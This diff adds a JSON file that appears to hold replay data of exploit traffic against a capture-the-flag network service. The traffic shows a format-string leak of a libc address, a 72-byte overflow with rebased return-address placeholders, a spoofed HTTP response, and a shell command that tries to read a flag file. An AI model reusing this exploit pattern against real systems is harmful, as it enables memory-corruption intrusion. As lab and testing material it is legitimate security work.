@@ -1,0 +1,9 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1welcome!0x{{{LIBC_BASE:133168:12:HEX:10:0x7f91b22f7830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:8:ORI:72:0x7f91b231c216}}}caaadaaa\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:6:ORI:72:0x7f91b231c216}}}HTTP/1.1 404 Not Found\\r\\nContent-Type{{{HEAP_BASE:122938:3:ORI:114:0x74203a}}}ext/html; c{{{HEAP_BASE:8552:3:ORI:128:0x726168}}}set=UTF-8\\r\\nContent-Length: 23\\r\\n{{{HEAP_BASE:9555:3:ORI:174:0x726553}}}{{{HEAP_BASE:9590:3:ORI:177:0x726576}}}: {{{HEAP_BASE:74053:3:ORI:170:0x736145}}}y{{{HEAP_BASE:9555:3:ORI:174:0x726553}}}{{{HEAP_BASE:9590:3:ORI:177:0x726576}}} (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0cat /fl{{{HEAP_BASE:75617:3:ORI:7:0x736761}}}/fake-cgi/flag\\n", 
+    "2sh: 1: cat: {{{HEAP_BASE:9552:3:ORI:12:0x726550}}}{{{HEAP_BASE:76141:3:ORI:15:0x73696d}}}sion denied\\n"
+]
